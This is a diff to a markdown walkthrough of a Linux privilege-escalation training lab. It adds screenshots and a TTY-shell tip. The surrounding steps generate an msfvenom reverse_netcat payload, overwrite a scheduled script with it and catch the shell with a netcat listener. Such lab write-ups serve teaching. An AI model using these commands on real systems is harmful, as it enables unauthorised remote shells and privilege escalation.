@@ -155,9 +155,13 @@ A: `-p`
 
 Walkthrough: Learnt through Google or through `msfvenom -h` command
 
+![](/Common%20Linux%20Privesc/images/msfvenom_payload.png)
+
 ## Task 8.4 - no answer needed
 
 Create a payload using `msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=8888 R`
+
+![](/Common%20Linux%20Privesc/images/payload_generation.png)
 
 ## Task 8.5
 
@@ -173,6 +177,14 @@ Replace the contents of the file with our payload using `echo <msfvenom> > autos
 
 After copying the code into autoscript.sh, start a netcat listener using the `nc -nvlp 8888` command on our Kali machine
 
+![](/Common%20Linux%20Privesc/images/netcat_listen.png)
+
 ## Task 8.8 - no answer needed
 
 After 5 minutes, we should get a shell
+
+## Extra Task
+
+In order to get a cleaner looking shell (known as TTY shell), try spawning one via the [NetSec list](https://netsec.ws/?p=337)
+
+![](/Common%20Linux%20Privesc/images/spawn_ttyshell.png)
